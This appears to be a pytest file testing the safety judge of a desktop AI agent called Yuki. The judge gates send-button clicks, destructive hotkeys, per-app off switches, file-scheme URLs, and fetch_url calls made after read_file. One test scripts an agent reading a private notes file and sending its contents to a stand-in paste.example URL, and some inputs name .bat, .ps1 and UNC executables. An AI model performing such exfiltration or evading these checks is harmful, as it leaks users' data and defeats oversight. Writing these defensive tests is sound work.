"""Review 34 fixes, builder fx1 (the design notes, 35-build-review-fixes.md).

One regression test (or a few) per finding: H2 committing clicks reach the judge, H3 the judge's memo is per target and
never keeps an allow of a call that can destroy or send, H5 the per-app "Act" switch is enforced, H6 window-lease
cleanup leaves no lock held, M1 a line break in typed text is a send, M2 open_url of a file and fetch_url after
read_file are judged. The memory-side findings (H8, M5, M9, M10, M11) are in tests/test_fx1_memory_fixes.py.

Fake model clients, stub desks, temp files only: no network, no desktop, no real memory, nothing sent.
"""

from __future__ import annotations

import json
import threading
import time
from pathlib import Path
from types import SimpleNamespace
from typing import Any, Callable

import pytest

from yuki.agent.loop import JUDGE_LABEL, Agent
from yuki.agent.memory import MemoryAccess
from yuki.config import Settings
from yuki.log.events import AskUser, SessionLogger
from yuki.voice.offline import StubDesktop

CHROME = 0x1001


# ---------------------------------------------------------------------------
# Fakes (the shapes tests/test_d_brain.py uses)
# ---------------------------------------------------------------------------


def _usage(inp: int = 10, out: int = 5, read: int = 0, write: int = 0) -> SimpleNamespace:
    return SimpleNamespace(input_tokens=inp, output_tokens=out, cache_read_input_tokens=read,
                           cache_creation_input_tokens=write)


def _block(kind: str, **kw: Any) -> SimpleNamespace:
    return SimpleNamespace(type=kind, **kw)


def _response(*blocks: SimpleNamespace) -> SimpleNamespace:
    return SimpleNamespace(content=list(blocks), stop_reason="tool_use", usage=_usage(), id="msg", model="m",
                           role="assistant", model_dump=lambda **_: {})


class _JudgeStream:
    def __init__(self, verdict: dict[str, Any], tool: str) -> None:
        self.verdict, self.tool = verdict, tool

    def __enter__(self) -> "_JudgeStream":
        return self

    def __exit__(self, *exc: Any) -> None:
        return None

    def __iter__(self):
        yield SimpleNamespace(type="message_start", message=SimpleNamespace(usage=_usage(inp=500, read=4300)))
        text = json.dumps(self.verdict)
        for i in range(0, len(text), 9):
            yield SimpleNamespace(type="content_block_delta", delta=SimpleNamespace(partial_json=text[i:i + 9]))

    def get_final_message(self) -> SimpleNamespace:
        return SimpleNamespace(content=[_block("tool_use", name=self.tool, input=self.verdict)],
                               usage=_usage(inp=500, out=30, read=4300))


class Client:
    """Scripted brain calls; the judge's streamed calls answered by ``judge(params)``."""

    def __init__(self, brain: list[SimpleNamespace], *, judge: Callable[[dict], dict] | None = None) -> None:
        self.brain = list(brain)
        self.brain_calls: list[dict] = []
        self.judge_calls: list[dict] = []
        self.judge = judge or (lambda params: {"decision": "allow", "sends": False, "scope": "call", "why": "ok"})
        self.messages = SimpleNamespace(create=self.create, stream=self.stream)

    def create(self, **params: Any) -> SimpleNamespace:
        self.brain_calls.append(params)
        return self.brain.pop(0)

    def stream(self, **params: Any) -> _JudgeStream:
        self.judge_calls.append(params)
        tool = params["tool_choice"]["name"]
        verdict = dict(self.judge(params))
        if tool == "review":
            verdict = {"asked": "x", "toward": verdict.get("decision") == "allow", "lasting": True,
                       "asked_effect": verdict.get("decision") == "allow", **verdict}
        return _JudgeStream(verdict, tool)


ALLOW = {"decision": "allow", "sends": False, "scope": "call", "why": "ok"}
ASK = {"decision": "ask_user", "sends": False, "scope": "call", "why": "not asked", "question": "Do it?"}


def _settings(tmp: Path, **kw: Any) -> Settings:
    return Settings(**{"log_dir": tmp / "sessions", "stream": False, "requests_csv": tmp / "r.csv",
                       "judge": True, "consult": False, "send_confirm_s": 0.2, **kw})


def _memory_none() -> MemoryAccess:
    return MemoryAccess(open_client=lambda: (_ for _ in ()).throw(RuntimeError("no memory in tests")))


BUTTON = {"id": 4, "role": "Button", "name": "Send", "center": (100, 200), "bounds": (90, 190, 110, 210),
          "is_interactive": True}
ITEM = {"id": 5, "role": "ListItem", "name": "How to cook rice", "center": (300, 400), "bounds": (200, 380, 400, 420),
        "is_interactive": True}
LINK = {"id": 6, "role": "Hyperlink", "name": "Docs", "center": (500, 400), "bounds": (480, 390, 520, 410),
        "is_interactive": True}
LABEL = {"id": 7, "role": "Text", "name": "Send", "center": (100, 200), "bounds": (95, 195, 105, 205),
         "is_interactive": False}
FIELD = {"id": 8, "role": "Edit", "name": "Message", "center": (300, 900), "bounds": (200, 880, 600, 920),
         "is_interactive": True}


class TreeDesk(StubDesktop):
    """A stub desk whose window reads return a fixed element list (so element ids stay valid between calls)."""

    def __init__(self, elements: list[dict]) -> None:
        super().__init__(action_delay_s=0)
        self.elements = elements

    def get_window_tree(self, hwnd: int, **kw: Any) -> dict[str, Any]:
        tree = super().get_window_tree(hwnd, **kw)
        tree["elements"] = [dict(e) for e in self.elements] if hwnd == CHROME else []
        return tree

    def window_at(self, x: int, y: int) -> int:
        return CHROME


def _agent(client: Client, tmp: Path, *, backend: Any = None, policy: Path | None = None) -> Agent:
    settings = _settings(tmp)
    agent = Agent(settings, SessionLogger(settings.sessions_dir, console=None), client=client,
                  backend=backend or StubDesktop(action_delay_s=0), prewarm=False, record_requests=False,
                  memory=_memory_none(), lane="worker")
    from yuki.agent.judge import PolicyReader

    agent.authorizer.policy = PolicyReader(policy or tmp / "autonomy.json")
    return agent


def _seed(agent: Agent, elements: list[dict]) -> None:
    d = agent.dispatcher
    d._reads += 1
    d._latest_trees[CHROME] = (d._reads, {e["id"]: dict(e) for e in elements})
    d._latest_tree_hwnd = CHROME


def _run(agent: Agent, words: str) -> list[Any]:
    events = []
    for ev in agent.run(words):
        events.append(ev)
        if isinstance(ev, AskUser):
            agent.answer("no")
    return events


def _done(i: int = 9) -> SimpleNamespace:
    return _response(_block("tool_use", id=f"d{i}", name="done", input={"message": "Done.", "about": []}))


def _texts(content: Any) -> str:
    out = []
    for block in content if isinstance(content, list) else [content]:
        if isinstance(block, dict):
            if block.get("type") == "text":
                out.append(block.get("text") or "")
            elif block.get("type") == "tool_result":
                out.append(_texts(block.get("content") or []))
    return "\n".join(out)


# ---------------------------------------------------------------------------
# H2: committing clicks reach the judge (UIA role, pending typed text), plain clicks stay fast
# ---------------------------------------------------------------------------


def test_h2_a_click_on_a_button_menu_item_or_split_button_is_gated_by_its_role() -> None:
    from yuki.agent.judge import POLICY_DEFAULTS, gate_reasons
    from yuki.agent.tools import call_traits

    gated = lambda **kw: bool(gate_reasons(call_traits("click", {"element": 3}, **kw), POLICY_DEFAULTS))  # noqa: E731
    for role in ("Button", "MenuItem", "SplitButton"):
        assert gated(role=role), role
    for role in ("ListItem", "TabItem", "Hyperlink", "TreeItem", "DataItem", "Edit", "Text", "", None):
        assert not gated(role=role), role                    # plain items, tabs and links stay ungated
    assert gated(role="ListItem", typed_pending=True)        # text waits in that window: the click can send it
    t = call_traits("click", {"element": 3}, typed_pending=True)
    assert t.reaches and not t.destroys
    # the tools' schemas do not change: click still has no risk field
    from yuki.agent.tools import RISK_TOOLS

    assert "click" not in RISK_TOOLS and "open_url" not in RISK_TOOLS


def test_h2_the_loop_judges_a_send_button_and_not_a_list_item(tmp_path: Path) -> None:
    desk = TreeDesk([BUTTON, ITEM, LINK, FIELD])
    client = Client([
        _response(_block("tool_use", id="t1", name="click", input={"element": 5, "expect_hwnd": CHROME})),
        _response(_block("tool_use", id="t2", name="click", input={"element": 6, "expect_hwnd": CHROME})),
        _response(_block("tool_use", id="t3", name="click", input={"element": 4, "expect_hwnd": CHROME})),
        _done(), _done(10)], judge=lambda p: ASK)
    agent = _agent(client, tmp_path, backend=desk)
    _seed(agent, [BUTTON, ITEM, LINK, FIELD])
    _run(agent, "open the second video")
    clicks = [c for c in desk.calls if c[0] == "click"]
    assert len(clicks) == 2                                          # the list item and the link ran unjudged
    first = [c for c in client.judge_calls if c["tool_choice"]["name"] == "verdict"]
    assert len(first) == 1                                           # only the Send button was judged
    message = first[0]["messages"][0]["content"]
    assert 'Button "Send"' in message and "send or submit" in message
    assert JUDGE_LABEL in _texts(client.brain_calls[3]["messages"][-1]["content"])


def test_h2_a_click_at_a_buttons_coordinates_is_gated_like_its_id(tmp_path: Path) -> None:
    desk = TreeDesk([BUTTON, LABEL, ITEM])
    client = Client([
        _response(_block("tool_use", id="t1", name="click", input={"x": 100, "y": 200, "expect_hwnd": CHROME})),
        _done()], judge=lambda p: ASK)
    agent = _agent(client, tmp_path, backend=desk)
    _seed(agent, [BUTTON, LABEL, ITEM])
    _run(agent, "what's on my screen?")
    assert not [c for c in desk.calls if c[0] == "click"]
    message = client.judge_calls[0]["messages"][0]["content"]
    # the smallest interactive element under the point (the Button, not its Text label) names the click
    assert 'Button "Send" (under the point)' in message


def test_h2_a_click_while_typed_text_waits_in_that_window_is_judged(tmp_path: Path) -> None:
    desk = TreeDesk([ITEM, FIELD])
    client = Client([
        _response(_block("tool_use", id="t1", name="type_text",
                         input={"element": 8, "expect_hwnd": CHROME, "text": "running late"})),
        _response(_block("tool_use", id="t2", name="click", input={"element": 5, "expect_hwnd": CHROME})),
        _done(), _done(10)], judge=lambda p: ASK)
    agent = _agent(client, tmp_path, backend=desk)
    _seed(agent, [ITEM, FIELD])
    _run(agent, "write running late in the box")
    assert [c[0] for c in desk.calls].count("type_text") == 1          # typing is not judged at the default
    assert not [c for c in desk.calls if c[0] == "click" and c[1] == (300, 400)]
    assert len([c for c in client.judge_calls if c["tool_choice"]["name"] == "verdict"]) == 1


# ---------------------------------------------------------------------------
# H3: the memo is per target; an allow of a call that can destroy or send is never replayed
# ---------------------------------------------------------------------------


def test_h3_an_allowed_ctrl_w_on_one_window_is_judged_again_on_another(tmp_path: Path) -> None:
    """Reproduction of review 34 H3: ctrl+w allowed on the dead video, then the same call on the inbox that showed
    next came back as "memo allow" with one judge call in total."""
    from yuki.agent.judge import Authorizer, PolicyReader

    asked: list[str] = []

    def judge(params: dict) -> dict:
        message = params["messages"][0]["content"]
        asked.append(message)
        return ALLOW if "YouTube" in message else ASK

    client = Client([], judge=judge)
    auth = Authorizer(lambda: client, _settings(tmp_path), policy=PolicyReader(tmp_path / "none.json"))
    words = [{"how": "voice", "text": "close the video that isn't available anymore"}]
    call = {"keys": ["ctrl", "w"], "expect_hwnd": CHROME}
    video = {"hwnd": CHROME, "app": "chrome.exe", "title": "Video unavailable - YouTube"}
    inbox = {"hwnd": CHROME, "app": "chrome.exe", "title": "Inbox (12) - Gmail"}
    first = auth.check("hotkey", call, words=words, target=video, signature="sig")
    assert first.allowed and first.source == "judge"
    second = auth.check("hotkey", call, words=words, target=inbox, signature="sig")
    assert not second.allowed and second.source != "memo"            # judged on the inbox, and held
    assert any("Inbox (12)" in m for m in asked)
    # the same allowed destroying call on the same window is judged again too (never memoized)
    calls = len(client.judge_calls)
    again = auth.check("hotkey", call, words=words, target=video, signature="sig")
    assert again.allowed and again.source == "judge" and len(client.judge_calls) == calls + 1
    # a held call tried again on the same target is the memo's denial (no new judge call)
    calls = len(client.judge_calls)
    held = auth.check("hotkey", call, words=words, target=inbox, signature="sig")
    assert not held.allowed and held.source == "memo" and len(client.judge_calls) == calls


def test_h3_a_quiet_allow_is_still_memoized_per_target(tmp_path: Path) -> None:
    from yuki.agent.judge import Authorizer, PolicyReader
    from yuki.ui import policy as ui_policy

    strict = tmp_path / "strict.json"
    ui_policy.save({"click_type": "ask"}, strict)
    client = Client([], judge=lambda p: {**ALLOW, "why": "a step toward it"})
    auth = Authorizer(lambda: client, _settings(tmp_path), policy=PolicyReader(strict))
    target = {"hwnd": 7, "app": "Code.exe", "title": "notes.md", "element": 'ListItem "a"'}
    auth.check("click", {"element": 1}, words=[], target=target, signature="a")
    deadline = time.monotonic() + 2
    while not auth.memo and time.monotonic() < deadline:
        time.sleep(0.01)
    n = len(client.judge_calls)
    v = auth.check("click", {"element": 1}, words=[], target=target, signature="a")
    assert v.allowed and v.source == "memo" and len(client.judge_calls) == n
    other = {**target, "hwnd": 8, "title": "main.py"}
    auth.check("click", {"element": 1}, words=[], target=other, signature="a")
    assert len(client.judge_calls) == n + 1


# ---------------------------------------------------------------------------
# H4/M3 (judge prompt): a short reply to Yuki's own card offer never authorises a send
# ---------------------------------------------------------------------------


def test_a_short_reply_to_yukis_card_offer_is_a_worked_ask_user_example_and_the_card_is_labelled(tmp_path: Path):
    """The fast first check approved an "ok" to a card asking "want a reply ready?" (1c-2's open case): the prompt
    now carries that very case as a worked ask_user example, and the request it reads marks the card as Yuki's."""
    from yuki.agent.judge import JUDGE_PROMPT, POLICY_DEFAULTS, judge_request
    from yuki.agent.tools import tool_traits

    start = JUDGE_PROMPT.index("16b. ")
    example = JUDGE_PROMPT[start:JUDGE_PROMPT.index("\n17. ", start)]
    assert example.startswith('16b. "ok" (replying to Yuki\'s card')
    assert "Want a reply ready?" in example and "press_enter" in example
    assert "/ ask_user, call, sends true" in example and "the card is not their words" in example
    assert "question:" in example
    assert not any(n in example for n in ("Hemanth", "Varun", "Elina"))   # invented, and not the scrubbed set
    # what the judge reads for that case: the card is Yuki's, only the "ok" is the user's
    now = time.time()
    words = [{"how": "card", "text": "Replying to your card: \"Priya asked when you're free tonight. Want a reply "
                                     "ready?\"", "at": now - 5},
             {"how": "typed", "text": "ok", "at": now - 5}]
    call = {"text": "free after 8", "press_enter": True, "expect_hwnd": 0x2002}
    params = judge_request(words, "type_text", call, target={"app": "WhatsApp.exe", "title": "Priya"},
                           levels=dict(POLICY_DEFAULTS), traits=tool_traits("type_text", call), model="m")
    message = params["messages"][0]["content"]
    assert "NOT their words" in message and "\"ok\"" in message and "send or submit" in message
    assert message.index("Want a reply ready?") < message.index("\"ok\"")


# ---------------------------------------------------------------------------
# H5: the per-app "Act" switch
# ---------------------------------------------------------------------------


def test_h5_the_policy_reader_reads_the_apps_and_matches_a_windows_process(tmp_path: Path) -> None:
    from yuki.agent.judge import PolicyReader, app_switched_off
    from yuki.ui import policy as ui_policy

    path = tmp_path / "autonomy.json"
    reader = PolicyReader(path)
    assert reader.apps() == {} and reader.app_off("Discord.exe") is None
    ui_policy.set_app_act("Discord", False, path)
    ui_policy.set_app_act("Spotify", True, path)
    apps = reader.apps()
    assert apps == {"discord": False, "spotify": True} == ui_policy.app_acts(path)   # yuki.ui.policy's own shape
    # the voice hands read it as {name: bool(value)} (yuki.voice.hands._app_acts): a switched-off app stays off
    assert {str(k).casefold(): bool(v) for k, v in apps.items()}["discord"] is False
    assert reader.app_entries()["discord"] == {"name": "Discord", "act": False}
    assert reader.app_off("Discord.exe") == "Discord" and reader.app_off("discord") == "Discord"
    assert reader.app_off("Spotify.exe") is None and reader.app_off(None) is None
    # a switch stored under the name Windows gives the app matches its process through that name
    stored = {"google chrome": {"name": "Google Chrome", "act": False}}
    names = lambda app: {"chrome.exe", "chrome", "google chrome"} if app == "chrome.exe" else {str(app)}  # noqa: E731
    assert app_switched_off("chrome.exe", stored, names=names) == "Google Chrome"
    assert app_switched_off("msedge.exe", stored, names=names) is None
    # the levels are still read from the same file
    assert reader.levels()["click_type"] == "do_and_tell"


def test_h5_a_click_or_type_in_a_switched_off_app_is_refused_without_a_judge_call(tmp_path: Path) -> None:
    from yuki.agent.judge import Authorizer, PolicyReader, input_refused_in
    from yuki.ui import policy as ui_policy

    path = tmp_path / "autonomy.json"
    ui_policy.set_app_act("Discord", False, path)
    client = Client([], judge=lambda p: ALLOW)
    auth = Authorizer(lambda: client, _settings(tmp_path), policy=PolicyReader(path))
    target = {"hwnd": 9, "app": "Discord.exe", "title": "#general - Discord"}
    for name, args in (("click", {"element": 2}), ("type_text", {"text": "hi"}), ("hotkey", {"keys": ["ctrl", "k"]}),
                       ("press", {"key": "enter"})):
        v = auth.check(name, args, words=[{"how": "typed", "text": "say hi in general"}], target=target, signature=name)
        assert v is not None and not v.allowed and v.source == "app_off", name
        assert "Discord" in v.why and "Settings" in v.why
    assert not client.judge_calls                                        # a hard refusal: no model call
    # media keys act system-wide, not in the app in front; other apps are untouched
    media = auth.check("press", {"key": "volumedown"}, words=[], target=target, signature="v")
    assert media is not None and media.source == "judge" and media.allowed     # keys are judged as always
    assert auth.check("click", {"element": 2}, words=[], target={"hwnd": 3, "app": "chrome.exe"}, signature="c") is None
    # the helper the voice hands call
    assert "Discord" in (input_refused_in("Discord.exe", "click", policy=PolicyReader(path)) or "")
    assert input_refused_in("Discord.exe", "press", {"key": "playpause"}, policy=PolicyReader(path)) is None
    assert input_refused_in("chrome.exe", "type_text", {"text": "x"}, policy=PolicyReader(path)) is None


def test_h5_the_loop_tells_the_brain_plainly_and_runs_nothing(tmp_path: Path) -> None:
    from yuki.ui import policy as ui_policy

    path = tmp_path / "autonomy.json"
    ui_policy.set_app_act("chrome", False, path)                        # the stub's front window is chrome.exe
    desk = TreeDesk([ITEM])
    client = Client([
        _response(_block("tool_use", id="t1", name="click", input={"element": 5, "expect_hwnd": CHROME})),
        _done()], judge=lambda p: ALLOW)
    agent = _agent(client, tmp_path, backend=desk, policy=path)
    _seed(agent, [ITEM])
    _run(agent, "click the second video")
    assert not [c for c in desk.calls if c[0] == "click"] and not client.judge_calls
    held = _texts(client.brain_calls[1]["messages"][-1]["content"])
    assert JUDGE_LABEL in held and "turned off clicking and typing in chrome" in held


# ---------------------------------------------------------------------------
# H6: window-lease cleanup never leaves a lock held
# ---------------------------------------------------------------------------


@pytest.fixture()
def fresh_leases(monkeypatch: pytest.MonkeyPatch):
    from yuki.actions import leases

    monkeypatch.setattr(leases, "_WINDOWS", {})
    monkeypatch.setattr(leases, "_WINDOW_USERS", {})
    return leases


def test_h6_more_than_256_windows_leave_no_lock_held_for_another_thread(fresh_leases: Any) -> None:
    """Reproduction of review 34 H6: 257+ distinct hwnds leased from one thread left ~128 locks held by it."""
    leases = fresh_leases
    for hwnd in range(1000, 1300):                       # 300 distinct windows, one thread
        with leases.window_lease(hwnd):
            pass
    assert len(leases._WINDOWS) <= leases.WINDOWS_KEEP + 1
    locks = list(leases._WINDOWS.values())
    free: list[bool] = []

    def other_thread() -> None:
        for lock in locks:
            got = lock.acquire(blocking=False)
            free.append(got)
            if got:
                lock.release()

    t = threading.Thread(target=other_thread)
    t.start()
    t.join(5)
    assert len(free) == len(locks) and all(free)        # none is held by the leasing thread
    with leases.window_lease(1299, timeout_s=0.2):      # and a lease from this thread still works
        pass
    assert not leases._WINDOW_USERS


def test_h6_a_held_or_awaited_lease_is_never_forgotten(fresh_leases: Any) -> None:
    leases = fresh_leases
    holding, release = threading.Event(), threading.Event()

    def holder() -> None:
        with leases.window_lease(42):
            holding.set()
            release.wait(5)

    t = threading.Thread(target=holder)
    t.start()
    assert holding.wait(2)
    lock = leases._WINDOWS[42]
    for hwnd in range(2000, 2400):                       # cleanup runs many times meanwhile
        with leases.window_lease(hwnd):
            pass
    assert leases._WINDOWS.get(42) is lock               # the held lease is the same lock, still known
    with pytest.raises(leases.LeaseBusy):                # so another hand still waits for it
        with leases.window_lease(42, timeout_s=0.1):
            pass
    release.set()
    t.join(2)
    with leases.window_lease(42, timeout_s=0.5):
        pass


# ---------------------------------------------------------------------------
# M1: a line break in typed text is a send
# ---------------------------------------------------------------------------


def test_m1_a_line_break_in_typed_text_reaches_like_enter() -> None:
    from yuki.agent.judge import POLICY_DEFAULTS, gate_reasons
    from yuki.agent.tools import tool_traits

    for text in ("running late\nsee you", "running late\r", "a\r\nb"):
        t = tool_traits("type_text", {"text": text})
        assert t.reaches and gate_reasons(t, POLICY_DEFAULTS), repr(text)
    assert not gate_reasons(tool_traits("type_text", {"text": "running late, see you"}), POLICY_DEFAULTS)
    assert not tool_traits("type_text", {"text": None}).reaches


# ---------------------------------------------------------------------------
# M2: open_url of a file or a non-web scheme, and fetch_url after read_file
# ---------------------------------------------------------------------------


def test_m2_open_url_of_a_file_or_another_scheme_is_judged() -> None:
    from yuki.agent.judge import POLICY_DEFAULTS, gate_reasons
    from yuki.agent.tools import tool_traits

    gated = lambda url: bool(gate_reasons(tool_traits("open_url", {"url": url}), POLICY_DEFAULTS))  # noqa: E731
    for url in ("https://example.com/doc", "http://localhost:3000", "HTTPS://Example.com"):
        assert not gated(url), url
    for url in ("C:\\Users\\me\\Downloads\\x.bat", "file:///C:/Users/me/x.ps1", "ms-settings:display",
                "steam://run/730", "youtube.com", "\\\\server\\share\\run.exe", ""):
        assert gated(url), url


def test_m2_fetch_url_after_read_file_goes_to_the_judge_with_the_read_listed(tmp_path: Path) -> None:
    secret = tmp_path / "notes.md"
    secret.write_text("budget 1.2M", encoding="utf-8")
    client = Client([
        _response(_block("tool_use", id="t1", name="read_file", input={"path": str(secret)})),
        _response(_block("tool_use", id="t2", name="fetch_url",
                         input={"url": "https://paste.example/?d=budget%201.2M"})),
        _done(), _done(10)], judge=lambda p: {**ASK, "sends": True})
    agent = _agent(client, tmp_path)
    assert not agent._outbound_read("fetch_url")
    _run(agent, "sum up my notes")
    verdicts = [c for c in client.judge_calls if c["tool_choice"]["name"] == "verdict"]
    assert len(verdicts) == 1
    message = verdicts[0]["messages"][0]["content"]
    assert "tool: fetch_url" in message and "read_file" in message and "send or submit" in message
    assert JUDGE_LABEL in _texts(client.brain_calls[2]["messages"][-1]["content"])
    from yuki.agent.tools import call_traits

    assert not call_traits("fetch_url", {"url": "https://x"}).reaches
    assert call_traits("fetch_url", {"url": "https://x"}, files_read=True).reaches


def test_m2_a_helper_fetches_nothing_after_reading_a_file(tmp_path: Path) -> None:
    from yuki.agent.subagents import Helper
    from yuki.agent.tools import ToolOutcome

    ran: list[str] = []

    class Disp:
        def dispatch(self, name: str, tool_input: dict) -> ToolOutcome:
            ran.append(name)
            return ToolOutcome(name=name, ok=True, summary="ok", content=[{"type": "text", "text": "ok"}])

    h = Helper(0, "read the notes", client=None, dispatcher=Disp(), memory=None, settings=_settings(tmp_path),
               nonce="N", cancelled=threading.Event(), post=lambda step: None)
    assert h._run_tool("fetch_url", {"url": "https://example.com"}).ok      # before any file read: allowed
    assert h._run_tool("read_file", {"path": "x"}).ok
    out = h._run_tool("fetch_url", {"url": "https://paste.example/?d=x"})
    assert not out.ok and "not available after read_file" in out.summary
    assert ran == ["fetch_url", "read_file"]
